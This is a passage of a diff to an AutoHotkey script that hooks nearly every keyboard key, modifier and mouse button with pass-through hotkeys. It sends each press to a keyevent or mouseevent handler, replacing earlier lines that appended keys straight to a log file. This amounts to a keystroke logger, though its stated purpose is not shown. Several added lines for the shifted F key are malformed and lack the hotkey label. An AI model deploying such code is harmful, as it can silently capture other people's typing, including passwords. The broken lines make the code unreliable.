+~!j::keyevent("j")
+~^j::keyevent("j")
+~k::keyevent("k")
+~#k::keyevent("k")
+~!k::keyevent("k")
+~^k::keyevent("k")
+~l::keyevent("l")
+~#l::keyevent("l")
+~!l::keyevent("l")
+~^l::keyevent("l")
+~m::keyevent("m")
+~#m::keyevent("m")
+~!m::keyevent("m")
+~^m::keyevent("m")
+~n::keyevent("n")
+~#n::keyevent("n")
+~!n::keyevent("n")
+~^n::keyevent("n")
+~o::keyevent("o")
+~#o::keyevent("o")
+~!o::keyevent("o")
+~^o::keyevent("o")
+~p::keyevent("p")
+~#p::keyevent("p")
+~!p::keyevent("p")
+~^p::keyevent("p")
+~q::keyevent("q")
+~#q::keyevent("q")
+~!q::keyevent("q")
+~^q::keyevent("q")
+~r::keyevent("r")
+~#r::keyevent("r")
+~!r::keyevent("r")
+~^r::keyevent("r")
+~s::keyevent("s")
+~#s::keyevent("s")
+~!s::keyevent("s")
+~^s::keyevent("s")
+~t::keyevent("t")
+~#t::keyevent("t")
+~!t::keyevent("t")
+~^t::keyevent("t")
+~u::keyevent("u")
+~#u::keyevent("u")
+~!u::keyevent("u")
+~^u::keyevent("u")
+~v::keyevent("v")
+~#v::keyevent("v")
+~!v::keyevent("v")
+~^v::keyevent("v")
+~w::keyevent("w")
+~#w::keyevent("w")
+~!w::keyevent("w")
+~^w::keyevent("w")
+~x::keyevent("x")
+~#x::keyevent("x")
+~!x::keyevent("x")
+~^x::keyevent("x")
+~y::keyevent("y")
+~#y::keyevent("y")
+~!y::keyevent("y")
+~^y::keyevent("y")
+~z::keyevent("z")
+~#z::keyevent("z")
+~!z::keyevent("z")
+~^z::keyevent("z")
+~+A::keyevent("A")
+~#+A::keyevent("A")
+~!+A::keyevent("A")
+~^+A::keyevent("A")
+~+B::keyevent("B")
+~#+B::keyevent("B")
+~!+B::keyevent("B")
+~^+B::keyevent("B")
+~+C::keyevent("C")
+~#+C::keyevent("C")
+~!+C::keyevent("C")
+~^+C::keyevent("C")
+~+D::keyevent("D")
+~#+D::keyevent("D")
+~!+D::keyevent("D")
+~^+D::keyevent("D")
+~+E::keyevent("E")
+~#+E::keyevent("E")
+~!+E::keyevent("E")
+~^+E::keyevent("E")
+~+keyevent("F")
+~#+keyevent("F")
+~!+keyevent("F")
+~^+keyevent("F")
+~+G::keyevent("G")
+~#+G::keyevent("G")
+~!+G::keyevent("G")
+~^+G::keyevent("G")
+~+H::keyevent("H")
+~#+H::keyevent("H")
+~!+H::keyevent("H")
+~^+H::keyevent("H")
+~+I::keyevent("I")
+~#+I::keyevent("I")
+~!+I::keyevent("I")
+~^+I::keyevent("I")
+~+J::keyevent("J")
+~#+J::keyevent("J")
+~!+J::keyevent("J")
+~^+J::keyevent("J")
+~+K::keyevent("K")
+~#+K::keyevent("K")
+~!+K::keyevent("K")
+~^+K::keyevent("K")
+~+L::keyevent("L")
+~#+L::keyevent("L")
+~!+L::keyevent("L")
+~^+L::keyevent("L")
+~+M::keyevent("M")
+~#+M::keyevent("M")
+~!+M::keyevent("M")
+~^+M::keyevent("M")
+~+N::keyevent("N")
+~#+N::keyevent("N")
+~!+N::keyevent("N")
+~^+N::keyevent("N")
+~+O::keyevent("O")
+~#+O::keyevent("O")
+~!+O::keyevent("O")
+~^+O::keyevent("O")
+~+P::keyevent("P")
+~#+P::keyevent("P")
+~!+P::keyevent("P")
+~^+P::keyevent("P")
+~+Q::keyevent("Q")
+~#+Q::keyevent("Q")
+~!+Q::keyevent("Q")
+~^+Q::keyevent("Q")
+~+R::keyevent("R")
+~#+R::keyevent("R")
+~!+R::keyevent("R")
+~^+R::keyevent("R")
+~+S::keyevent("S")
+~#+S::keyevent("S")
+~!+S::keyevent("S")
+~^+S::keyevent("S")
+~+T::keyevent("T")
+~#+T::keyevent("T")
+~!+T::keyevent("T")
+~^+T::keyevent("T")
+~+U::keyevent("U")
+~#+U::keyevent("U")
+~!+U::keyevent("U")
+~^+U::keyevent("U")
+~+V::keyevent("V")
+~#+V::keyevent("V")
+~!+V::keyevent("V")
+~^+V::keyevent("V")
+~+W::keyevent("W")
+~#+W::keyevent("W")
+~!+W::keyevent("W")
+~^+W::keyevent("W")
+~+X::keyevent("X")
+~#+X::keyevent("X")
+~!+X::keyevent("X")
+~^+X::keyevent("X")
+~+Y::keyevent("Y")
+~#+Y::keyevent("Y")
+~!+Y::keyevent("Y")
+~^+Y::keyevent("Y")
+~+Z::keyevent("Z")
+~#+Z::keyevent("Z")
+~!+Z::keyevent("Z")
+~^+Z::keyevent("Z")
+~`::keyevent("``")
+~#`::keyevent("``")
+~!`::keyevent("``")
+~^`::keyevent("``")
+~!::keyevent("!")
+~#!::keyevent("!")
+~!!::keyevent("!")
+~^!::keyevent("!")
+~@::keyevent("@")
+~#@::keyevent("@")
+~!@::keyevent("@")
+~^@::keyevent("@")
+~#::keyevent("#")
+~##::keyevent("#")
+~!#::keyevent("#")
+~^#::keyevent("#")
+~$::keyevent("$")
+~#$::keyevent("$")
+~!$::keyevent("$")
+~^$::keyevent("$")
+~^::keyevent("^")
+~#^::keyevent("^")
+~!^::keyevent("^")
+~^^::keyevent("^")
+~&::keyevent("&")
+~#&::keyevent("&")
+~!&::keyevent("&")
+~^&::keyevent("&")
+~*::keyevent("*")
+~#*::keyevent("*")
+~!*::keyevent("*")
+~^*::keyevent("*")
+~(::keyevent("(")
+~#(::keyevent("(")
+~!(::keyevent("(")
+~^(::keyevent("(")
+~)::keyevent(")")
+~#)::keyevent(")")
+~!)::keyevent(")")
+~^)::keyevent(")")
+~-::keyevent("-")
+~#-::keyevent("-")
+~!-::keyevent("-")
+~^-::keyevent("-")
+~_::keyevent("_")
+~#_::keyevent("_")
+~!_::keyevent("_")
+~^_::keyevent("_")
+~=::keyevent("=")
+~#=::keyevent("=")
+~!=::keyevent("=")
+~^=::keyevent("=")
+~+::keyevent("+")
+~#+::keyevent("+")
+~!+::keyevent("+")
+~^+::keyevent("+")
+~[::keyevent("[")
+~#[::keyevent("[")
+~![::keyevent("[")
+~^[::keyevent("[")
+~{::keyevent("{")
+~#{::keyevent("{")
+~!{::keyevent("{")
+~^{::keyevent("{")
+~]::keyevent("]")
+~#]::keyevent("]")
+~!]::keyevent("]")
+~^]::keyevent("]")
+~}::keyevent("}")
+~#}::keyevent("}")
+~!}::keyevent("}")
+~^}::keyevent("}")
+~\::keyevent("\")
+~#\::keyevent("\")
+~!\::keyevent("\")
+~^\::keyevent("\")
+~|::keyevent("|")
+~#|::keyevent("|")
+~!|::keyevent("|")
+~^|::keyevent("|")
+~+;::keyevent(":")
+~#+;::keyevent(":")
+~!+;::keyevent(":")
+~^+;::keyevent(":")
+~;::keyevent("`;")
+~#;::keyevent("`;")
+~!;::keyevent("`;")
+~^;::keyevent("`;")
+~SC028::keyevent("'")
+~#SC028::keyevent("'")
+~!SC028::keyevent("'")
+~^SC028::keyevent("'")
+~+SC028::keyevent(doublequote)
+~#+SC028::keyevent(doublequote)
+~!+SC028::keyevent(doublequote)
+~^+SC028::keyevent(doublequote)
+~,::keyevent(",")
+~#,::keyevent(",")
+~!,::keyevent(",")
+~^,::keyevent(",")
+~.::keyevent(".")
+~#.::keyevent(".")
+~!.::keyevent(".")
+~^.::keyevent(".")
+~<::keyevent("<")
+~#<::keyevent("<")
+~!<::keyevent("<")
+~^<::keyevent("<")
+~>::keyevent(">")
+~#>::keyevent(">")
+~!>::keyevent(">")
+~^>::keyevent(">")
+~/::keyevent("/")
+~#/::keyevent("/")
+~!/::keyevent("/")
+~^/::keyevent("/")
+~?::keyevent("?")
+~#?::keyevent("?")
+~!?::keyevent("?")
+~^?::keyevent("?")
+~1::keyevent("1")
+~#1::keyevent("1")
+~!1::keyevent("1")
+~^1::keyevent("1")
+~2::keyevent("2")
+~#2::keyevent("2")
+~!2::keyevent("2")
+~^2::keyevent("2")
+~3::keyevent("3")
+~#3::keyevent("3")
+~!3::keyevent("3")
+~^3::keyevent("3")
+~4::keyevent("4")
+~#4::keyevent("4")
+~!4::keyevent("4")
+~^4::keyevent("4")
+~5::keyevent("5")
+~#5::keyevent("5")
+~!5::keyevent("5")
+~^5::keyevent("5")
+~6::keyevent("6")
+~#6::keyevent("6")
+~!6::keyevent("6")
+~^6::keyevent("6")
+~7::keyevent("7")
+~#7::keyevent("7")
+~!7::keyevent("7")
+~^7::keyevent("7")
+~8::keyevent("8")
+~#8::keyevent("8")
+~!8::keyevent("8")
+~^8::keyevent("8")
+~9::keyevent("9")
+~#9::keyevent("9")
+~!9::keyevent("9")
+~^9::keyevent("9")
+~0::keyevent("0")
+~#0::keyevent("0")
+~!0::keyevent("0")
+~^0::keyevent("0")
+~Space::keyevent("%A_Space%")
+~#Space::keyevent("%A_Space%")
+~!Space::keyevent("%A_Space%")
+~^Space::keyevent("%A_Space%")
+~Tab::keyevent("{Tab}")
+~#Tab::keyevent("{Tab}")
+~!Tab::keyevent("{Tab}")
+~^Tab::keyevent("{Tab}")
+~Enter::keyevent("{Enter}")
+~#Enter::keyevent("{Enter}")
+~!Enter::keyevent("{Enter}")
+~^Enter::keyevent("{Enter}")
+~Esc::keyevent("{Esc}")
+~#Esc::keyevent("{Esc}")
+~!Esc::keyevent("{Esc}")
+~^Esc::keyevent("{Esc}")
+~SC00E::keyevent("{BS}")
+~#SC00E::keyevent("{BS}")
+~!SC00E::keyevent("{BS}")
+~^SC00E::keyevent("{BS}")
+~Pause::keyevent("{Pause}")
+~#Pause::keyevent("{Pause}")
+~!Pause::keyevent("{Pause}")
+~^Pause::keyevent("{Pause}")
+~ScrollLock::keyevent("{ScrollLock}")
+~#ScrollLock::keyevent("{ScrollLock}")
+~!ScrollLock::keyevent("{ScrollLock}")
+~^ScrollLock::keyevent("{ScrollLock}")
+~Delete::keyevent("{Delete}")
+~#Delete::keyevent("{Delete}")
+~!Delete::keyevent("{Delete}")
+~^Delete::keyevent("{Delete}")
+~Insert::keyevent("{Insert}")
+~#Insert::keyevent("{Insert}")
+~!Insert::keyevent("{Insert}")
+~^Insert::keyevent("{Insert}")
+~Home::keyevent("{Home}")
+~#Home::keyevent("{Home}")
+~!Home::keyevent("{Home}")
+~^Home::keyevent("{Home}")
+~End::keyevent("{End}")
+~#End::keyevent("{End}")
+~!End::keyevent("{End}")
+~^End::keyevent("{End}")
+~PgUp::keyevent("{PgUp}")
+~#PgUp::keyevent("{PgUp}")
+~!PgUp::keyevent("{PgUp}")
+~^PgUp::keyevent("{PgUp}")
+~PgDn::keyevent("{PgDn}")
+~#PgDn::keyevent("{PgDn}")
+~!PgDn::keyevent("{PgDn}")
+~^PgDn::keyevent("{PgDn}")
+~Up::keyevent("{Up}")
+~#Up::keyevent("{Up}")
+~!Up::keyevent("{Up}")
+~^Up::keyevent("{Up}")
+~Down::keyevent("{Down}")
+~#Down::keyevent("{Down}")
+~!Down::keyevent("{Down}")
+~^Down::keyevent("{Down}")
+~Left::keyevent("{Left}")
+~#Left::keyevent("{Left}")
+~!Left::keyevent("{Left}")
+~^Left::keyevent("{Left}")
+~Right::keyevent("{Right}")
+~#Right::keyevent("{Right}")
+~!Right::keyevent("{Right}")
+~^Right::keyevent("{Right}")
+~CapsLock::keyevent("{CapsLock}")
+~#CapsLock::keyevent("{CapsLock}")
+~!CapsLock::keyevent("{CapsLock}")
+~^CapsLock::keyevent("{CapsLock}")
+~NumLock::keyevent("{NumLock}")
+~#NumLock::keyevent("{NumLock}")
+~!NumLock::keyevent("{NumLock}")
+~^NumLock::keyevent("{NumLock}")
+~Numpad0::keyevent("{Numpad0}")
+~#Numpad0::keyevent("{Numpad0}")
+~!Numpad0::keyevent("{Numpad0}")
+~^Numpad0::keyevent("{Numpad0}")
+~Numpad1::keyevent("{Numpad1}")
+~#Numpad1::keyevent("{Numpad1}")
+~!Numpad1::keyevent("{Numpad1}")
+~^Numpad1::keyevent("{Numpad1}")
+~Numpad2::keyevent("{Numpad2}")
+~#Numpad2::keyevent("{Numpad2}")
+~!Numpad2::keyevent("{Numpad2}")
+~^Numpad2::keyevent("{Numpad2}")
+~Numpad3::keyevent("{Numpad3}")
+~#Numpad3::keyevent("{Numpad3}")
+~!Numpad3::keyevent("{Numpad3}")
+~^Numpad3::keyevent("{Numpad3}")
+~Numpad4::keyevent("{Numpad4}")
+~#Numpad4::keyevent("{Numpad4}")
+~!Numpad4::keyevent("{Numpad4}")
+~^Numpad4::keyevent("{Numpad4}")
+~Numpad5::keyevent("{Numpad5}")
+~#Numpad5::keyevent("{Numpad5}")
+~!Numpad5::keyevent("{Numpad5}")
+~^Numpad5::keyevent("{Numpad5}")
+~Numpad6::keyevent("{Numpad6}")
+~#Numpad6::keyevent("{Numpad6}")
+~!Numpad6::keyevent("{Numpad6}")
+~^Numpad6::keyevent("{Numpad6}")
+~Numpad7::keyevent("{Numpad7}")
+~#Numpad7::keyevent("{Numpad7}")
+~!Numpad7::keyevent("{Numpad7}")
+~^Numpad7::keyevent("{Numpad7}")
+~Numpad8::keyevent("{Numpad8}")
+~#Numpad8::keyevent("{Numpad8}")
+~!Numpad8::keyevent("{Numpad8}")
+~^Numpad8::keyevent("{Numpad8}")
+~Numpad9::keyevent("{Numpad9}")
+~#Numpad9::keyevent("{Numpad9}")
+~!Numpad9::keyevent("{Numpad9}")
+~^Numpad9::keyevent("{Numpad9}")
+~NumpadAdd::keyevent("{NumpadAdd}")
+~#NumpadAdd::keyevent("{NumpadAdd}")
+~!NumpadAdd::keyevent("{NumpadAdd}")
+~^NumpadAdd::keyevent("{NumpadAdd}")
+~NumpadClear::keyevent("{NumpadClear}")
+~#NumpadClear::keyevent("{NumpadClear}")
+~!NumpadClear::keyevent("{NumpadClear}")
+~^NumpadClear::keyevent("{NumpadClear}")
+~NumpadDel::keyevent("{NumpadDel}")
+~#NumpadDel::keyevent("{NumpadDel}")
+~!NumpadDel::keyevent("{NumpadDel}")
+~^NumpadDel::keyevent("{NumpadDel}")
+~NumpadDiv::keyevent("{NumpadDiv}")
+~#NumpadDiv::keyevent("{NumpadDiv}")
+~!NumpadDiv::keyevent("{NumpadDiv}")
+~^NumpadDiv::keyevent("{NumpadDiv}")
+~NumpadDot::keyevent("{NumpadDot}")
+~#NumpadDot::keyevent("{NumpadDot}")
+~!NumpadDot::keyevent("{NumpadDot}")
+~^NumpadDot::keyevent("{NumpadDot}")
+~NumpadDown::keyevent("{NumpadDown}")
+~#NumpadDown::keyevent("{NumpadDown}")
+~!NumpadDown::keyevent("{NumpadDown}")
+~^NumpadDown::keyevent("{NumpadDown}")
+~NumpadEnd::keyevent("{NumpadEnd}")
+~#NumpadEnd::keyevent("{NumpadEnd}")
+~!NumpadEnd::keyevent("{NumpadEnd}")
+~^NumpadEnd::keyevent("{NumpadEnd}")
+~NumpadEnter::keyevent("{NumpadEnter}")
+~#NumpadEnter::keyevent("{NumpadEnter}")
+~!NumpadEnter::keyevent("{NumpadEnter}")
+~^NumpadEnter::keyevent("{NumpadEnter}")
+~NumpadHome::keyevent("{NumpadHome}")
+~#NumpadHome::keyevent("{NumpadHome}")
+~!NumpadHome::keyevent("{NumpadHome}")
+~^NumpadHome::keyevent("{NumpadHome}")
+~NumpadIns::keyevent("{NumpadIns}")
+~#NumpadIns::keyevent("{NumpadIns}")
+~!NumpadIns::keyevent("{NumpadIns}")
+~^NumpadIns::keyevent("{NumpadIns}")
+~NumpadLeft::keyevent("{NumpadLeft}")
+~#NumpadLeft::keyevent("{NumpadLeft}")
+~!NumpadLeft::keyevent("{NumpadLeft}")
+~^NumpadLeft::keyevent("{NumpadLeft}")
+~NumpadMult::keyevent("{NumpadMult}")
+~#NumpadMult::keyevent("{NumpadMult}")
+~!NumpadMult::keyevent("{NumpadMult}")
+~^NumpadMult::keyevent("{NumpadMult}")
+~NumpadPgDn::keyevent("{NumpadPgDn}")
+~#NumpadPgDn::keyevent("{NumpadPgDn}")
+~!NumpadPgDn::keyevent("{NumpadPgDn}")
+~^NumpadPgDn::keyevent("{NumpadPgDn}")
+~NumpadPgUp::keyevent("{NumpadPgUp}")
+~#NumpadPgUp::keyevent("{NumpadPgUp}")
+~!NumpadPgUp::keyevent("{NumpadPgUp}")
+~^NumpadPgUp::keyevent("{NumpadPgUp}")
+~NumpadRight::keyevent("{NumpadRight}")
+~#NumpadRight::keyevent("{NumpadRight}")
+~!NumpadRight::keyevent("{NumpadRight}")
+~^NumpadRight::keyevent("{NumpadRight}")
+~NumpadSub::keyevent("{NumpadSub}")
+~#NumpadSub::keyevent("{NumpadSub}")
+~!NumpadSub::keyevent("{NumpadSub}")
+~^NumpadSub::keyevent("{NumpadSub}")
+~NumpadUp::keyevent("{NumpadUp}")
+~#NumpadUp::keyevent("{NumpadUp}")
+~!NumpadUp::keyevent("{NumpadUp}")
+~^NumpadUp::keyevent("{NumpadUp}")
+~F1::keyevent("{F1}")
+~#F1::keyevent("{F1}")
+~!F1::keyevent("{F1}")
+~^F1::keyevent("{F1}")
+~F2::keyevent("{F2}")
+~#F2::keyevent("{F2}")
+~!F2::keyevent("{F2}")
+~^F2::keyevent("{F2}")
+~F3::keyevent("{F3}")
+~#F3::keyevent("{F3}")
+~!F3::keyevent("{F3}")
+~^F3::keyevent("{F3}")
+~F4::keyevent("{F4}")
+~#F4::keyevent("{F4}")
+~!F4::keyevent("{F4}")
+~^F4::keyevent("{F4}")
+~F5::keyevent("{F5}")
+~#F5::keyevent("{F5}")
+~!F5::keyevent("{F5}")
+~^F5::keyevent("{F5}")
+~F6::keyevent("{F6}")
+~#F6::keyevent("{F6}")
+~!F6::keyevent("{F6}")
+~^F6::keyevent("{F6}")
+~F7::keyevent("{F7}")
+~#F7::keyevent("{F7}")
+~!F7::keyevent("{F7}")
+~^F7::keyevent("{F7}")
+~F8::keyevent("{F8}")
+~#F8::keyevent("{F8}")
+~!F8::keyevent("{F8}")
+~^F8::keyevent("{F8}")
+~F9::keyevent("{F9}")
+~#F9::keyevent("{F9}")
+~!F9::keyevent("{F9}")
+~^F9::keyevent("{F9}")
+~F10::keyevent("{F10}")
+~#F10::keyevent("{F10}")
+~!F10::keyevent("{F10}")
+~^F10::keyevent("{F10}")
+~F11::keyevent("{F11}")
+~#F11::keyevent("{F11}")
+~!F11::keyevent("{F11}")
+~^F11::keyevent("{F11}")
+~F12::keyevent("{F12}")
+~#F12::keyevent("{F12}")
+~!F12::keyevent("{F12}")
+~^F12::keyevent("{F12}")
+~F13::keyevent("{F13}")
+~#F13::keyevent("{F13}")
+~!F13::keyevent("{F13}")
+~^F13::keyevent("{F13}")
+~F14::keyevent("{F14}")
+~#F14::keyevent("{F14}")
+~!F14::keyevent("{F14}")
+~^F14::keyevent("{F14}")
+~F15::keyevent("{F15}")
+~#F15::keyevent("{F15}")
+~!F15::keyevent("{F15}")
+~^F15::keyevent("{F15}")
+~F16::keyevent("{F16}")
+~#F16::keyevent("{F16}")
+~!F16::keyevent("{F16}")
+~^F16::keyevent("{F16}")
+~F17::keyevent("{F17}")
+~#F17::keyevent("{F17}")
+~!F17::keyevent("{F17}")
+~^F17::keyevent("{F17}")
+~F18::keyevent("{F18}")
+~#F18::keyevent("{F18}")
+~!F18::keyevent("{F18}")
+~^F18::keyevent("{F18}")
+~F19::keyevent("{F19}")
+~#F19::keyevent("{F19}")
+~!F19::keyevent("{F19}")
+~^F19::keyevent("{F19}")
+~F20::keyevent("{F20}")
+~#F20::keyevent("{F20}")
+~!F20::keyevent("{F20}")
+~^F20::keyevent("{F20}")
+~F21::keyevent("{F21}")
+~#F21::keyevent("{F21}")
+~!F21::keyevent("{F21}")
+~^F21::keyevent("{F21}")
+~F22::keyevent("{F22}")
+~#F22::keyevent("{F22}")
+~!F22::keyevent("{F22}")
+~^F22::keyevent("{F22}")
+~F23::keyevent("{F23}")
+~#F23::keyevent("{F23}")
+~!F23::keyevent("{F23}")
+~^F23::keyevent("{F23}")
+~F24::keyevent("{F24}")
+~#F24::keyevent("{F24}")
+~!F24::keyevent("{F24}")
+~^F24::keyevent("{F24}")
+~AppsKey::keyevent("{AppsKey}")
+~#AppsKey::keyevent("{AppsKey}")
+~!AppsKey::keyevent("{AppsKey}")
+~^AppsKey::keyevent("{AppsKey}")
 
-~PrintScreen::FileAppend, {PrintScreen}, *%log%
-~#PrintScreen::FileAppend, {PrintScreen}, *%log%
-~!PrintScreen::FileAppend, {PrintScreen}, *%log%
-~^PrintScreen::FileAppend, {PrintScreen}, *%log%
+~PrintScreen::keyevent("{PrintScreen}")
+~#PrintScreen::keyevent("{PrintScreen}")
+~!PrintScreen::keyevent("{PrintScreen}")
+~^PrintScreen::keyevent("{PrintScreen}")
 
 ~LButton::mouseevent("LButton")
 ~#LButton::mouseevent("LButton")
@@ -729,12 +724,12 @@ Loop {
 ~!WheelRight::mouseevent("WheelRight")
 ~^WheelRight::mouseevent("WheelRight")
 
-~LWin::FileAppend, {LWin}, *%log%
-~RWin::FileAppend, {RWin}, *%log%
-~LControl::FileAppend, {LControl}, *%log%
-~RControl::FileAppend, {RControl}, *%log%
-~LShift::FileAppend, {LShift}, *%log%
-~RShift::FileAppend, {RShift}, *%log%
-~LAlt::FileAppend, {LAlt}, *%log%
-~RAlt::FileAppend, {RAlt}, *%log%
+~LWin::keyevent("{LWin}")
+~RWin::keyevent("{RWin}")
+~LControl::keyevent("{LControl}")
+~RControl::keyevent("{RControl}")
+~LShift::keyevent("{LShift}")
+~RShift::keyevent("{RShift}")
+~LAlt::keyevent("{LAlt}")
+~RAlt::keyevent("{RAlt}")
 
